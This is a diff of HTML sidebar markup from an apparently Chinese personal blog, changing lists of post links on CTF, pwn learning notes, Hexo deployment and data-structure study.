   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Misc/" title="分类于 杂七杂八的知识点">杂七杂八的知识点</a>
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
 </div>
 
-    <span><a href="/2024/05/25/Misc/BUUCTF-Misc-%E7%AC%AC%E4%B8%80%E9%A1%B5-1-16/" title="BUUCTF-Misc-第一页(1-16)">BUUCTF-Misc-第一页(1-16)</a></span>
+    <span><a href="/2024/06/14/Daily/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="hexo部署服务器">hexo部署服务器</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/2024/05/29/Java/JavaWeb%E5%9F%BA%E7%A1%80-%E4%B8%80-IO%E6%93%8D%E4%BD%9C/" title="JavaWeb基础(一)-IO操作">JavaWeb基础(一)-IO操作</a></span>
+    <span><a href="/2024/02/04/Pwn/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/2024/06/06/Game/%E3%80%902024%E3%80%91LitCTF/" title="【2024】LitCTF">【2024】LitCTF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/01/01/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/2024/06/11/Daily/%E9%9A%8F%E6%9C%BA%E4%BA%8C%E6%AC%A1%E5%85%83%E5%9B%BEapi%E7%9B%B8%E5%85%B3/" title="随机二次元图api相关">随机二次元图api相关</a></span>
   </li>
 
       
@@ -595,29 +555,7 @@ emmIDA 版本问题吧，识别不出 rust。。。。</p>
 <a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/2024/03/05/Pwn/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%9C%AA%E5%AE%8C%E5%85%A8%E5%AE%8C%E6%88%90%EF%BC%89/" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
-</div>
-
-    <span><a href="/2024/06/14/Daily/hexo%E9%83%A8%E7%BD%B2%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="hexo部署服务器">hexo部署服务器</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
-</div>
-
-    <span><a href="/2024/06/12/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0-2%E3%80%81%E7%BA%BF%E6%80%A7%E8%A1%A8/" title="数据结构笔记-2、线性表">数据结构笔记-2、线性表</a></span>
+    <span><a href="/2024/03/25/Pwn/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89-%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81/" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></span>
   </li>
 
   </ul>
